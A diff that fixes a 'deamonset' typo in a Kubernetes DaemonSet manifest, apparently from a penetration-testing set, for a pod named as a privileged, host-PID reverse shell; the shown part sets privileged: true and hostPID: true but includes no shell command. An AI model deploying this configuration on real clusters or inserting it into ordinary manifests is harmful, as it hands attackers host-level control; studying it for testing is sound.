@@ -1,24 +1,24 @@
 apiVersion: apps/v1
 kind: DaemonSet
 metadata:
-  name: priv-and-hostpid-revshell-deamonset
+  name: priv-and-hostpid-revshell-daemonset
   labels:
     app: pentest
-    type: deamonset
+    type: daemonset
 spec:
   selector:
     matchLabels:
       app: pentest
-      type: deamonset
+      type: daemonset
   template:
     metadata:
       labels:
         app: pentest
-        type: deamonset
+        type: daemonset
     spec:
       hostPID: true
       containers:
-      - name: priv-and-hostpid-revshell-deamonset
+      - name: priv-and-hostpid-revshell-daemonset
         image: busybox
         securityContext:
           privileged: true
